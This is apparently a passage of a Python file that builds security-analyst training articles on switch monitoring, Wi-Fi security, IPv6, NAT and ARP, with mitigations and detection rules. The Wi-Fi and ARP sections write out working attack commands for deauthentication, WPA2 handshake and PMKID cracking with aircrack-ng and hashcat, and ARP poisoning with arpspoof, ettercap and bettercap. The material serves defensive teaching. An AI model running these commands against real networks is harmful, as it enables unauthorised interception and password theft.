## Monitoring Switches for Security

```bash
# Check for spanning tree changes
show spanning-tree detail

# View port security violations
show port-security
show logging | include PORT_SECURITY

# Check for unusual MAC counts
show mac address-table count

# Monitor for BPDU guard violations
show logging | include BPDU

# Verify 802.1X status
show dot1x all

# Wireshark filters for switch protocols
stp                    # Spanning tree BPDUs
eapol                  # 802.1X authentication
lldp                   # Link Layer Discovery Protocol
cdp                    # Cisco Discovery Protocol
```

## Key Analyst Takeaways

1. **MAC flooding is a real attack** that turns switches into hubs -- port security prevents it
2. **STP attacks grant MitM position** -- BPDU Guard and Root Guard are essential
3. **802.1X prevents unauthorized devices** from connecting to the network
4. **The CAM table is forensic evidence** -- it maps MACs to physical ports
5. **PortFast should only be on access ports** -- never on trunk ports
6. **STP convergence causes brief outages** -- distinguish from attacks
7. **Monitor for BPDU Guard violations** -- they indicate misconfiguration or attack
"""
    ))

    # -------------------------------------------------------------------------
    # Article 10: Wireless Networking Standards and Security
    # -------------------------------------------------------------------------
    articles.append((
        "Wireless Networking Standards and Security",
        ["networking", "wireless", "wifi", "wpa", "802.11", "wireless-security"],
        r"""# Wireless Networking Standards and Security

## 802.11 Standards Overview

| Standard | Year | Frequency   | Max Speed  | Range     | Notes               |
|----------|------|-------------|------------|-----------|---------------------|
| 802.11a  | 1999 | 5 GHz       | 54 Mbps    | ~35m      | Less interference   |
| 802.11b  | 1999 | 2.4 GHz     | 11 Mbps    | ~70m      | First mainstream    |
| 802.11g  | 2003 | 2.4 GHz     | 54 Mbps    | ~70m      | Backward compat b   |
| 802.11n  | 2009 | 2.4/5 GHz   | 600 Mbps   | ~70m      | MIMO, Wi-Fi 4       |
| 802.11ac | 2013 | 5 GHz       | 6.9 Gbps   | ~35m      | MU-MIMO, Wi-Fi 5    |
| 802.11ax | 2019 | 2.4/5/6 GHz | 9.6 Gbps   | ~35m      | OFDMA, Wi-Fi 6/6E   |

## Wireless Frequencies and Channels

### 2.4 GHz Band

```
Channel:  1    2    3    4    5    6    7    8    9   10   11
Freq:   2412 2417 2422 2427 2432 2437 2442 2447 2452 2457 2462

Non-overlapping channels: 1, 6, 11

   Ch 1          Ch 6          Ch 11
|---------|   |---------|   |---------|
  22 MHz       22 MHz        22 MHz

Best practice: Only use channels 1, 6, and 11 to avoid co-channel interference
```

### 5 GHz Band

More channels available (36, 40, 44, 48, 52, 56, 60, 64, 100-165).
Less interference but shorter range due to higher frequency.

## Wireless Security Protocols

### Evolution of Wi-Fi Security

```
WEP (1999)  -->  WPA (2003)  -->  WPA2 (2004)  -->  WPA3 (2018)
(Broken)         (Interim)        (Current std)      (Latest)
RC4 cipher       TKIP             AES-CCMP           SAE/AES-GCMP
24-bit IV        48-bit IV        Per-packet keys     Forward secrecy
```

### WEP (Wired Equivalent Privacy) -- BROKEN

```
Vulnerabilities:
- 24-bit IV (Initialization Vector) is too short -> IV reuse within hours
- Key stream recovery possible with enough captured packets
- Tools: aircrack-ng can crack WEP in minutes

Status: NEVER use WEP. If you find WEP on your network, it is a critical finding.
```

### WPA/WPA2 Security Comparison

| Feature          | WPA (TKIP)        | WPA2 (AES)         | WPA3              |
|------------------|--------------------|--------------------|---------------------|
| Cipher           | TKIP (RC4-based)   | AES-CCMP           | AES-GCMP-256        |
| Key Exchange     | 4-way handshake    | 4-way handshake    | SAE (Dragonfly)     |
| Known Attacks    | TKIP vulns         | KRACK, PMKID, dict | Dragonblood (patched)|
| Forward Secrecy  | No                 | No                 | Yes                 |
| Status           | Deprecated         | Current standard   | Recommended          |

### WPA2 Authentication Modes

```
WPA2-Personal (PSK):
  - Pre-Shared Key (password)
  - All users share the same password
  - Suitable for home/small office
  - Vulnerable to dictionary attacks on captured handshake

WPA2-Enterprise (802.1X):
  - Individual credentials per user (via RADIUS)
  - Supports certificates (EAP-TLS)
  - Per-user encryption keys
  - Audit trail of who connected when
  - Required for corporate environments
```

### WPA3 Improvements

```
SAE (Simultaneous Authentication of Equals):
  - Replaces PSK 4-way handshake
  - Resistant to offline dictionary attacks
  - Provides forward secrecy (past sessions safe if key compromised)
  - Based on Dragonfly key exchange

Enhanced Open (OWE - Opportunistic Wireless Encryption):
  - Encrypts open networks (coffee shops, airports)
  - No password needed but traffic is encrypted
  - Prevents passive eavesdropping on open Wi-Fi
```

## Common Wireless Attacks

### Evil Twin Attack

```
Legitimate AP: "CorporateWiFi" (BSSID: AA:BB:CC:11:22:33)
Evil Twin:     "CorporateWiFi" (BSSID: DD:EE:FF:44:55:66)

Attacker creates AP with same SSID, stronger signal.
Victims auto-connect to stronger signal.
Attacker intercepts all traffic (MitM).

Tools: hostapd, airbase-ng, WiFi-Pumpkin
```

### Deauthentication Attack

```
Attacker sends forged deauth frames (management frames are unencrypted):

  Attacker --> [Deauth: "Client, disconnect from AP"] --> Client
  Client disconnects and may reconnect to evil twin

Tool: aireplay-ng -0 10 -a <AP_BSSID> -c <Client_MAC> wlan0mon

Mitigation: 802.11w (Management Frame Protection) - part of WPA3
```

### WPA2 Handshake Capture and Cracking

```
1. Monitor mode:    airmon-ng start wlan0
2. Capture traffic: airodump-ng wlan0mon
3. Target AP:       airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w cap wlan0mon
4. Force handshake: aireplay-ng -0 1 -a AA:BB:CC:11:22:33 wlan0mon
5. Crack offline:   aircrack-ng cap-01.cap -w wordlist.txt

Or with hashcat:
  hcxpcapngtool capture.pcapng -o hash.hc22000
  hashcat -m 22000 hash.hc22000 wordlist.txt
```

### PMKID Attack (WPA2)

Does not require a client to be connected -- the PMKID can be extracted from the
AP's first message:

```
hcxdumptool -i wlan0mon --enable_status=1 -o dump.pcapng
hcxpcapngtool dump.pcapng -o pmkid.hc22000
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

### Rogue Access Point

Unauthorized AP connected to the corporate network, creating a backdoor.

**Detection:**
```bash
# Wireless scanning tools
# Linux:
iwlist wlan0 scan
nmcli dev wifi list

# Windows:
netsh wlan show networks mode=bssid

# Dedicated tools: Kismet, Nzyme, Meraki/Aruba rogue AP detection
```

## Wireless Security Best Practices

```
1. Use WPA3-Enterprise if possible, WPA2-Enterprise minimum
2. Never use WEP or WPA-TKIP
3. Use strong PSK (20+ chars) if PSK mode required
4. Enable 802.11w (Management Frame Protection)
5. Disable WPS (Wi-Fi Protected Setup) - PIN brute-forceable
6. Hide SSID is NOT security (trivially discovered)
7. MAC filtering is NOT security (trivially spoofed)
8. Deploy WIDS/WIPS (Wireless Intrusion Detection/Prevention)
9. Segment wireless traffic from wired (separate VLAN)
10. Regular wireless surveys to detect rogue APs
11. Use certificate-based auth (EAP-TLS) for enterprise
12. Disable auto-connect to open networks on corporate devices
```

## Wireshark for Wireless Analysis

```bash
# Capture wireless traffic in monitor mode
# Must use monitor mode to see management/control frames

# Wireshark display filters:
wlan.fc.type == 0           # Management frames
wlan.fc.type == 1           # Control frames
wlan.fc.type == 2           # Data frames

wlan.fc.subtype == 0        # Association request
wlan.fc.subtype == 8        # Beacon frames
wlan.fc.subtype == 11       # Authentication
wlan.fc.subtype == 12       # Deauthentication

eapol                       # 802.1X / WPA handshake
wlan.ssid == "TargetNetwork"  # Filter by SSID

# Show only deauth frames (attack indicator)
wlan.fc.type_subtype == 0x000c
```

## Key Analyst Takeaways

1. **WEP on the network = critical finding** requiring immediate remediation
2. **Evil twin attacks are easy to execute** and hard to detect without WIDS
3. **WPA2-PSK is vulnerable to offline dictionary attacks** if handshake is captured
4. **WPA3 mitigates most PSK attacks** but adoption is still growing
5. **Monitor for deauthentication floods** -- they indicate active wireless attacks
6. **Rogue AP detection** should be continuous, not just periodic surveys
7. **Enterprise wireless should use 802.1X with certificates** for maximum security
"""
    ))

    # -------------------------------------------------------------------------
    # Article 11: IPv6 Fundamentals and Security Implications
    # -------------------------------------------------------------------------
    articles.append((
        "IPv6 Fundamentals and Security Implications",
        ["networking", "ipv6", "addressing", "ndp", "dual-stack"],
        r"""# IPv6 Fundamentals and Security Implications

## Why IPv6 Exists

IPv4 provides approximately 4.3 billion addresses (2^32). With the growth of the
internet, mobile devices, and IoT, this is not enough. IPv6 provides 2^128
addresses -- approximately 3.4 x 10^38 unique addresses.

## IPv6 Address Format

```
IPv4:  192.168.1.100                (32 bits, dotted decimal)
IPv6:  2001:0db8:85a3:0000:0000:8a2e:0370:7334  (128 bits, hex colon)

Shortening rules:
  1. Leading zeros in each group can be dropped:
     2001:0db8:0001:0000:0000:0000:0000:0001
  -> 2001:db8:1:0:0:0:0:1

  2. One sequence of consecutive all-zero groups can be replaced with ::
  -> 2001:db8:1::1

  Cannot use :: more than once (ambiguous).
```

## IPv6 Address Types

| Type           | Prefix        | Purpose                          | IPv4 Equivalent    |
|----------------|---------------|----------------------------------|--------------------|
| Global Unicast | 2000::/3      | Public routable addresses        | Public IPv4        |
| Link-Local     | fe80::/10     | Auto-configured, single link     | 169.254.0.0/16     |
| Unique Local   | fc00::/7      | Private (not routable on internet)| RFC 1918           |
| Multicast      | ff00::/8      | One-to-many delivery             | 224.0.0.0/4        |
| Loopback       | ::1/128       | Localhost                        | 127.0.0.1          |
| Unspecified     | ::/128        | No address assigned              | 0.0.0.0            |

### Link-Local Addresses (fe80::/10)

Every IPv6-enabled interface automatically generates a link-local address. These are
used for neighbor discovery, router solicitation, and local communication.

```
Link-local format:
  fe80::  +  Interface ID (derived from MAC or random)

Example: fe80::a00:27ff:fe4e:66a1

Key point: Link-local addresses are ALWAYS present on IPv6 interfaces,
even if no global address is configured. This has security implications.
```

## IPv6 Address Configuration Methods

```
1. SLAAC (Stateless Address Autoconfiguration):
   - Host generates its own address using Router Advertisement + Interface ID
   - No DHCP server needed
   - Router provides prefix; host appends interface ID

2. DHCPv6 (Stateful):
   - Similar to DHCP for IPv4
   - Server assigns specific addresses

3. DHCPv6 Stateless:
   - Host uses SLAAC for address
   - DHCPv6 provides additional config (DNS, domain, etc.)

4. Manual/Static:
   - Manually assigned (servers, infrastructure)
```

## Neighbor Discovery Protocol (NDP)

NDP replaces ARP in IPv6 and performs additional functions using ICMPv6:

| Message                    | ICMPv6 Type | Purpose                          |
|----------------------------|-------------|----------------------------------|
| Router Solicitation (RS)   | 133         | Host asks for router info        |
| Router Advertisement (RA)  | 134         | Router announces prefix/config   |
| Neighbor Solicitation (NS) | 135         | Like ARP request (who has IP?)   |
| Neighbor Advertisement (NA)| 136         | Like ARP reply (I have that IP)  |
| Redirect                   | 137         | Router suggests better next-hop  |

```bash
# View IPv6 neighbor table (like ARP cache)
ip -6 neigh show          # Linux
netsh interface ipv6 show neighbors   # Windows

# View IPv6 addresses
ip -6 addr show           # Linux
ipconfig /all              # Windows (shows both v4 and v6)
```

## IPv6-Specific Security Threats

### Rogue Router Advertisements

An attacker sends forged Router Advertisements to redirect traffic:

```
Attacker sends RA:
  "I am the default router, use prefix 2001:db8:evil::/64"

Victims auto-configure addresses with attacker's prefix.
All traffic routes through attacker (MitM).

This is the IPv6 equivalent of rogue DHCP, but HARDER to prevent
because SLAAC is a fundamental IPv6 mechanism.

Tools: THC-IPv6 suite, fake_router6, Scapy
```

**Mitigation:** RA Guard on managed switches:
```
# Cisco RA Guard:
ipv6 nd raguard policy HOST_POLICY
  device-role host
interface GigabitEthernet0/1
  ipv6 nd raguard attach-policy HOST_POLICY
```

### NDP Spoofing (IPv6 ARP Spoofing)

Similar to ARP spoofing but using Neighbor Advertisement messages:

```
Attacker sends NA:
  "IP 2001:db8::1 is at MAC aa:bb:cc:dd:ee:ff" (attacker MAC)

Victim updates neighbor cache, sends traffic to attacker.
```

**Mitigation:** IPv6 ND Inspection, SEND (Secure Neighbor Discovery)

### IPv6 Extension Header Abuse

IPv6 uses extension headers for options (unlike IPv4 options in the main header).
These can be abused:

```
Extension Headers:
  Hop-by-Hop Options (0)
  Routing Header (43)     <- Can specify intermediate nodes (source routing)
  Fragment Header (44)    <- Fragmentation-based evasion
  Destination Options (60)

Attacks:
  - Large chains of extension headers can bypass firewalls/IDS
  - Type 0 Routing Header enables source routing attacks (deprecated)
  - Fragmentation overlapping can evade inspection
```

### IPv6 Tunneling Risks

IPv6 transition mechanisms can create security blind spots:

```
6to4:     Encapsulates IPv6 in IPv4 (protocol 41)
Teredo:   IPv6 over UDP/IPv4 (port 3544)
ISATAP:   IPv6 over IPv4 (intra-site)

Risk: These tunnels can bypass IPv4-only security controls.
IPv6 traffic encapsulated in IPv4 may not be inspected by
firewalls that only understand IPv4.

Detection:
  - Monitor for protocol 41 (6in4 tunneling)
  - Monitor for UDP port 3544 (Teredo)
  - Block unauthorized tunnel endpoints
```

### Dual-Stack Risks

When both IPv4 and IPv6 are enabled (common default in modern OS):

```
Problem:
  - Organization has IPv4 security controls (firewall, IDS, proxy)
  - IPv6 is enabled by default on endpoints
  - No IPv6 security controls deployed
  - Attacker uses IPv6 to bypass all IPv4 security

Windows, macOS, and Linux all enable IPv6 by default.
```

## IPv6 Reconnaissance

```bash
# Ping all nodes on local link (discover IPv6 hosts)
ping6 ff02::1%eth0         # Linux
ping -6 ff02::1%5          # Windows (interface index)

# Scan for IPv6 hosts on link-local
nmap -6 --script targets-ipv6-multicast-echo fe80::1%eth0

# IPv6 port scan
nmap -6 -sS -p 1-1024 2001:db8::1

# Trace IPv6 route
traceroute6 2001:4860:4860::8888    # Linux
tracert -6 2001:4860:4860::8888     # Windows
```

## IPv6 Security Best Practices

```
1. If you do not use IPv6, disable it at the network level (not just host)
   Or better: deploy IPv6 with proper security controls

2. Deploy RA Guard on all switch access ports

3. Enable IPv6 ND Inspection (similar to ARP inspection)

4. Ensure firewalls inspect IPv6 traffic (not just IPv4)

5. Block unauthorized tunneling protocols (6to4, Teredo, ISATAP)

6. Include IPv6 addresses in logging and monitoring

7. Use IPv6 address privacy extensions (RFC 4941) to prevent tracking

8. Filter unnecessary ICMPv6 types but allow essential ones:
   Must allow: NS/NA (135/136), RS/RA (133/134) on internal
   Should block: Redirect (137) from non-router ports

9. Deploy DNSSEC for AAAA records

10. Test security tools with IPv6 traffic -- many fail silently
```

## IPv6 Header Comparison with IPv4

```
IPv4 Header: 20-60 bytes (variable due to options)
  - Version, IHL, DSCP, Total Length
  - Identification, Flags, Fragment Offset
  - TTL, Protocol, Header Checksum
  - Source Address (32 bits)
  - Destination Address (32 bits)
  - Options (variable)

IPv6 Header: Fixed 40 bytes (simpler, faster processing)
  - Version, Traffic Class, Flow Label
  - Payload Length, Next Header, Hop Limit
  - Source Address (128 bits)
  - Destination Address (128 bits)
  - NO checksum (relies on upper layers)
  - NO fragmentation fields (uses extension header)
```

## Key Analyst Takeaways

1. **IPv6 is probably enabled on your network** even if you do not use it
2. **Link-local addresses always exist** -- attackers can use IPv6 for lateral movement
3. **Rogue RA attacks are the IPv6 equivalent of rogue DHCP** -- deploy RA Guard
4. **Dual-stack without dual security = bypass opportunity** for attackers
5. **IPv6 tunnels can evade IPv4 security controls** -- monitor for tunnel protocols
6. **IPv6 address space makes scanning impractical** -- /64 subnet has 2^64 addresses
7. **Your IDS/IPS/firewall must understand IPv6** -- test with IPv6 traffic
"""
    ))

    # -------------------------------------------------------------------------
    # Article 12: NAT and PAT How Network Address Translation Works
    # -------------------------------------------------------------------------
    articles.append((
        "NAT and PAT How Network Address Translation Works",
        ["networking", "nat", "pat", "address-translation", "firewall"],
        r"""# NAT and PAT: How Network Address Translation Works

## What NAT Does

NAT (Network Address Translation) modifies IP addresses in packet headers as they
traverse a router or firewall. It maps private (RFC 1918) addresses to public
addresses, enabling many internal devices to share a limited number of public IPs.

```
Internal Network              NAT Device              Internet
192.168.1.0/24                                        Public IP: 203.0.113.10

192.168.1.100 ----+
192.168.1.101 ----|---> [NAT Router] ---> 203.0.113.10 ---> Internet
192.168.1.102 ----+

All internal hosts appear as 203.0.113.10 to the internet.
```

## Types of NAT

### Static NAT (One-to-One)

Maps a single private IP to a single public IP permanently:

```
192.168.1.10  <-->  203.0.113.10   (always)
192.168.1.11  <-->  203.0.113.11   (always)

Use case: Servers that need a consistent public address
  - Web servers, mail servers, VPN endpoints

# Cisco configuration:
ip nat inside source static 192.168.1.10 203.0.113.10
```

### Dynamic NAT (Many-to-Many Pool)

Maps internal IPs to a pool of public IPs on a first-come, first-served basis:

```
Pool: 203.0.113.10 - 203.0.113.20 (11 public IPs)

192.168.1.100 --> 203.0.113.10 (while active)
192.168.1.101 --> 203.0.113.11 (while active)
192.168.1.102 --> 203.0.113.12 (while active)

If pool is exhausted, additional hosts cannot connect.

# Cisco:
ip nat pool MYPOOL 203.0.113.10 203.0.113.20 netmask 255.255.255.0
ip nat inside source list 1 pool MYPOOL
```

### PAT / NAT Overload (Many-to-One)

Maps many internal IPs to a single public IP using different source ports:

```
192.168.1.100:45000 --> 203.0.113.10:10001 --> web server
192.168.1.101:45001 --> 203.0.113.10:10002 --> web server
192.168.1.102:45002 --> 203.0.113.10:10003 --> web server

The NAT device tracks port mappings in a translation table.
This is the most common form of NAT (used in home routers).

# Cisco:
ip nat inside source list 1 interface GigabitEthernet0/1 overload
```

## NAT Translation Table

The NAT device maintains a table mapping internal to external addresses:

```
+------------------+-------------------+----------+---------+
| Inside Local     | Inside Global     | Protocol | Timeout |
+------------------+-------------------+----------+---------+
| 192.168.1.100:45000 | 203.0.113.10:10001 | TCP   | 86400  |
| 192.168.1.101:45001 | 203.0.113.10:10002 | TCP   | 86400  |
| 192.168.1.102:55000 | 203.0.113.10:10003 | UDP   | 300    |
+------------------+-------------------+----------+---------+

# View NAT translations (Cisco):
show ip nat translations
show ip nat statistics

# Linux iptables NAT:
iptables -t nat -L -n -v
conntrack -L
```

## NAT Terminology

| Term           | Definition                                        |
|----------------|---------------------------------------------------|
| Inside Local   | Private IP of internal host (192.168.1.100)       |
| Inside Global  | Public IP representing internal host (203.0.113.10)|
| Outside Local  | How external host appears from inside (usually same as Outside Global)|
| Outside Global | Real public IP of external host (8.8.8.8)         |

## How NAT Affects Security

### Benefits

```
1. Hides internal network topology from the internet
2. Prevents direct inbound connections (implicit firewall)
3. Allows private addressing internally
4. Makes reconnaissance harder (one public IP for many hosts)
```

### Challenges

```
1. Breaks end-to-end connectivity model
2. Complicates forensic investigations (which internal host?)
3. Can interfere with protocols that embed IPs in payload:
   - FTP (active mode)
   - SIP/VoIP
   - IPsec (AH mode)
   - Some gaming protocols
4. ALG (Application Layer Gateway) needed for some protocols
5. Hides the true source of malicious traffic from external observers
```

## NAT Logging for Forensics

NAT logs are **critical** for tracing internet activity back to internal hosts:

```
Scenario: External server logs show attack from 203.0.113.10 at 14:30:00

Without NAT logs: You know YOUR public IP was the source, but not which
                  of your 500 internal hosts did it.

With NAT logs:    203.0.113.10:10001 = 192.168.1.100:45000 at 14:30:00
                  Now you know it was 192.168.1.100

NAT log format (example):
  2026-02-27 14:30:00 NAT TCP 192.168.1.100:45000 -> 203.0.113.10:10001
                       destination 93.184.216.34:443
```

### Enabling NAT Logging

```bash
# Linux (iptables with logging):
iptables -t nat -A POSTROUTING -o eth0 -j LOG --log-prefix "NAT: "
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Or use conntrack logging:
conntrack -E -o timestamp

# Cisco:
ip nat log translations syslog

# Windows (ICS logging):
# Check: C:\Windows\System32\LogFiles\
```

## NAT Traversal

Some protocols and applications need to work through NAT:

```
STUN (Session Traversal Utilities for NAT):
  - Client discovers its public IP and port mapping
  - Used by WebRTC, VoIP

TURN (Traversal Using Relays around NAT):
  - Relay server when direct connection impossible
  - Fallback when STUN fails

ICE (Interactive Connectivity Establishment):
  - Framework combining STUN and TURN
  - Used in VoIP and video conferencing

NAT-T (NAT Traversal for IPsec):
  - Encapsulates IPsec in UDP (port 4500)
  - Required when VPN endpoints are behind NAT

UPnP (Universal Plug and Play):
  - Devices automatically create port forwards
  - SECURITY RISK: malware can use UPnP to open ports
  - Best practice: DISABLE UPnP on perimeter devices
```

## Port Forwarding (Destination NAT / DNAT)

Maps inbound connections on specific ports to internal servers:

```
Internet --> 203.0.113.10:80  --> NAT --> 192.168.1.50:80  (Web server)
Internet --> 203.0.113.10:443 --> NAT --> 192.168.1.50:443 (Web server)
Internet --> 203.0.113.10:25  --> NAT --> 192.168.1.60:25  (Mail server)

# Linux iptables:
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 192.168.1.50:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to 192.168.1.50:443
```

**Security note:** Every port forward is an attack surface. Audit regularly.

## Carrier-Grade NAT (CGNAT)

ISPs use CGNAT to share public IPs among multiple customers:

```
Your home: 192.168.1.0/24 --> [Home NAT] --> 100.64.x.x --> [ISP CGNAT] --> Public IP

Double NAT: Your private IP is NATted twice before reaching the internet.

Impact on security:
  - Multiple households share one public IP
  - Log correlation becomes extremely difficult
  - Law enforcement needs ISP CGNAT logs + timestamp for attribution
  - CGNAT range: 100.64.0.0/10
```

## Diagnosing NAT Issues

```bash
# Check your public IP
curl ifconfig.me                    # Linux
Invoke-RestMethod ifconfig.me       # PowerShell

# Compare with local IP
ipconfig                            # Windows
ip addr show                        # Linux

# If they differ, NAT is in the path

# Check NAT type (for gaming/VoIP):
# Full cone, restricted cone, port restricted, symmetric
# Use STUN test tools

# Wireshark: observe IP changes at different capture points
# Capture before NAT: see private IPs
# Capture after NAT: see public IPs
# Compare to understand the NAT mapping
```

## Key Analyst Takeaways

1. **NAT logs are essential for forensics** -- without them, you cannot attribute
   outbound connections to specific internal hosts
2. **PAT is ubiquitous** -- almost every network uses it
3. **Port forwards are attack surface** -- audit them regularly
4. **CGNAT (100.64.0.0/10) means multiple customers share one IP** -- complicates attribution
5. **UPnP should be disabled** on perimeter devices to prevent unauthorized port opens
6. **NAT is NOT a firewall** -- it provides some protection but is not a substitute
7. **Ensure NAT logging retention** meets your compliance and forensic requirements
8. **Double NAT can cause protocol issues** -- especially for VPN and VoIP
"""
    ))

    # -------------------------------------------------------------------------
    # Article 13: ARP Protocol and Layer 2 Security
    # -------------------------------------------------------------------------
    articles.append((
        "ARP Protocol and Layer 2 Security",
        ["networking", "arp", "layer2", "spoofing", "mitm"],
        r"""# ARP Protocol and Layer 2 Security

## What ARP Does

ARP (Address Resolution Protocol) maps IPv4 addresses to MAC (hardware) addresses
on a local network segment. When a device needs to send a frame to another device
on the same subnet, it must know the destination MAC address. ARP provides this
mapping.

## How ARP Works

```
Host A (192.168.1.100) wants to communicate with Host B (192.168.1.200)

Step 1: Host A checks its ARP cache
        "Do I have a MAC for 192.168.1.200?"

Step 2: If not cached, Host A sends ARP Request (broadcast)
        "Who has 192.168.1.200? Tell 192.168.1.100"
        Destination MAC: FF:FF:FF:FF:FF:FF (broadcast)
        Source MAC: AA:AA:AA:AA:AA:AA (Host A)

Step 3: All hosts on the segment receive the broadcast
        Only Host B responds

Step 4: Host B sends ARP Reply (unicast)
        "192.168.1.200 is at BB:BB:BB:BB:BB:BB"
        Destination MAC: AA:AA:AA:AA:AA:AA (Host A)
        Source MAC: BB:BB:BB:BB:BB:BB (Host B)

Step 5: Host A caches the mapping and sends the frame

   Host A                               Host B
   192.168.1.100                        192.168.1.200
   AA:AA:AA:AA:AA:AA                    BB:BB:BB:BB:BB:BB
      |                                    |
      |--- ARP Request (broadcast) ------->|
      |    "Who has 192.168.1.200?"        |
      |                                    |
      |<-- ARP Reply (unicast) ------------|
      |    "I am at BB:BB:BB:BB:BB:BB"     |
      |                                    |
      |=== Data frame (unicast) ==========>|
```

## ARP Cache

Every device maintains an ARP cache (table) of recently resolved IP-to-MAC mappings:

```bash
# View ARP cache
arp -a                    # Windows and Linux
ip neigh show             # Linux (modern)

# Example output:
Interface: 192.168.1.100
  Internet Address    Physical Address    Type
  192.168.1.1         00:1a:2b:3c:4d:5e   dynamic
  192.168.1.200       bb:bb:bb:bb:bb:bb   dynamic
  192.168.1.255       ff:ff:ff:ff:ff:ff   static

# Clear ARP cache
arp -d *                  # Windows (admin)
ip neigh flush all        # Linux
```

### ARP Cache Timers

| OS        | Default Timeout | Notes                               |
|-----------|-----------------|-------------------------------------|
| Windows   | 15-45 seconds   | Reachable time, random within range |
| Linux     | 30 seconds      | gc_stale_time; varies by distro     |
| Cisco IOS | 4 hours         | Much longer on network devices      |
| macOS     | 20 minutes      | Default expiry                      |

## Gratuitous ARP

A gratuitous ARP is an ARP reply sent without a corresponding request. The sender
announces its own IP-to-MAC mapping to the network.

```
Legitimate uses:
  - IP address change notification
  - Duplicate IP detection
  - Failover (HSRP/VRRP updates)
  - Virtual machine migration

Security concern:
  Gratuitous ARP is the foundation of ARP spoofing.
  There is no authentication -- anyone can send one.
```

## ARP Spoofing / ARP Poisoning

### The Attack

An attacker sends forged ARP replies to associate their MAC address with another
host's IP address (typically the default gateway):

```
Normal state:
  Victim ARP cache:  192.168.1.1 -> GW:GW:GW:GW:GW:GW (real gateway)
  Gateway ARP cache: 192.168.1.100 -> AA:AA:AA:AA:AA:AA (real victim)

After ARP poisoning:
  Victim ARP cache:  192.168.1.1 -> EV:EV:EV:EV:EV:EV (ATTACKER MAC)
  Gateway ARP cache: 192.168.1.100 -> EV:EV:EV:EV:EV:EV (ATTACKER MAC)

Result:
  Victim sends all traffic to Attacker (thinks it is the gateway)
  Gateway sends all traffic to Attacker (thinks it is the victim)
  Attacker forwards traffic after inspection = Man-in-the-Middle

   Victim -----> Attacker -----> Gateway -----> Internet
   Victim <----- Attacker <----- Gateway <----- Internet
```

### Attack Tools

```bash
# arpspoof (dsniff suite)
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1   # Poison victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100   # Poison gateway

# ettercap (full MitM framework)
ettercap -T -M arp:remote /192.168.1.100// /192.168.1.1//

# bettercap (modern alternative)
set arp.spoof.targets 192.168.1.100
arp.spoof on

# Enable IP forwarding (attacker must forward traffic)
echo 1 > /proc/sys/net/ipv4/ip_forward    # Linux
```

### What the Attacker Can Do After ARP Spoofing

```
1. Capture credentials (HTTP, FTP, Telnet, POP3 -- anything unencrypted)
2. Capture and modify DNS responses (redirect to phishing sites)
3. Inject content into HTTP responses
4. Perform SSL stripping (downgrade HTTPS to HTTP)
5. Capture session cookies
6. Sniff all network traffic on the segment
```

## Detecting ARP Spoofing

```bash
# Look for duplicate IP-to-MAC mappings
arp -a | sort                         # Check for duplicate IPs

# Monitor ARP traffic with tcpdump
tcpdump -i eth0 arp -n

# Wireshark display filters:
arp                                   # All ARP traffic
arp.duplicate-address-detected        # Wireshark built-in detection
arp.opcode == 2                       # ARP replies only

# Look for gratuitous ARPs
arp.isgratuitous == 1

# Indicators of ARP spoofing:
# 1. Multiple MACs claiming the same IP
# 2. Rapid ARP replies without requests
# 3. Gateway MAC changing unexpectedly
# 4. ARP replies for IPs that were not requested
```

### Automated Detection Tools

```
arpwatch:   Monitors ARP activity, alerts on changes
  arpwatch -i eth0

XArp:       Windows ARP spoofing detector

Snort/Suricata rules:
  alert arp any any -> any any (msg:"ARP Spoofing Detected";
    arp_opcode:2; threshold:type both, track by_src, count 30,
    seconds 1;)
```

## ARP Spoofing Mitigations

### Dynamic ARP Inspection (DAI)

DAI validates ARP packets on the switch using the DHCP snooping binding table:

```
# Cisco configuration:
ip arp inspection vlan 10,20,30

# Trust uplinks (to DHCP server, router):
interface GigabitEthernet0/48
  ip arp inspection trust

# Rate limit ARP on access ports (prevent DoS):
interface range GigabitEthernet0/1-44
  ip arp inspection limit rate 15

# DAI checks:
  - Source MAC in Ethernet header matches sender MAC in ARP
  - Sender IP in ARP matches DHCP snooping binding
  - Invalid ARPs are dropped and logged
```

### Static ARP Entries

For critical infrastructure (gateway, DNS, DHCP), use static entries:

```bash
# Windows:
netsh interface ipv4 add neighbors "Ethernet" 192.168.1.1 00-1A-2B-3C-4D-5E

# Linux:
ip neigh add 192.168.1.1 lladdr 00:1a:2b:3c:4d:5e dev eth0 nud permanent

# Cisco:
arp 192.168.1.100 00aa.bbcc.ddee ARPA
```

### Additional Mitigations

```
1. DHCP Snooping (required for DAI to work)
2. Port Security (limits MACs per port)
3. Private VLANs (isolate hosts from each other)
4. Use encrypted protocols (HTTPS, SSH) to limit exposure even if MitM occurs
5. 802.1X authentication (limits who connects to the network)
6. Network segmentation (reduces ARP scope)
```

## Proxy ARP

Proxy ARP is when a router answers ARP requests on behalf of hosts on another
subnet:

```
Host on 192.168.1.0/24 ARPs for 10.0.0.50
Router has a route to 10.0.0.0/24
Router replies with its OWN MAC address

Host sends traffic to router MAC, router forwards to 10.0.0.50
```

**Security concern:** Proxy ARP can be abused and should be disabled unless needed:
```
# Cisco - disable proxy ARP:
interface GigabitEthernet0/0
  no ip proxy-arp
```

## ARP in Forensic Investigations

```
ARP cache is volatile evidence -- it expires quickly.

Forensic value:
  1. Confirms which MAC was associated with an IP at a point in time
  2. Identifies rogue devices on the network
  3. Detects ARP spoofing in progress
  4. Maps physical devices to IP addresses

Collection:
  - arp -a on live systems (volatile, time-sensitive)
  - DHCP snooping binding table on switches (persistent)
  - DAI logs on switches (if enabled)
  - Packet captures containing ARP traffic
```

## Key Analyst Takeaways

1. **ARP has no authentication** -- any device can claim any IP-to-MAC mapping
2. **ARP spoofing enables complete traffic interception** on the local segment
3. **DAI (Dynamic ARP Inspection) is the primary defense** -- deploy on all VLANs
4. **Gateway MAC changing unexpectedly** is a strong indicator of ARP spoofing
5. **ARP cache is volatile** -- collect it early in incident response
6. **Even with ARP spoofing, TLS protects data** -- but credentials for unencrypted protocols are exposed
7. **Disable proxy ARP** on router interfaces unless specifically needed
"""
    ))

    # -------------------------------------------------------------------------
    # Article 14: ICMP and Network Diagnostics
    # -------------------------------------------------------------------------
    articles.append((
        "ICMP and Network Diagnostics",
        ["networking", "icmp", "ping", "traceroute", "diagnostics"],
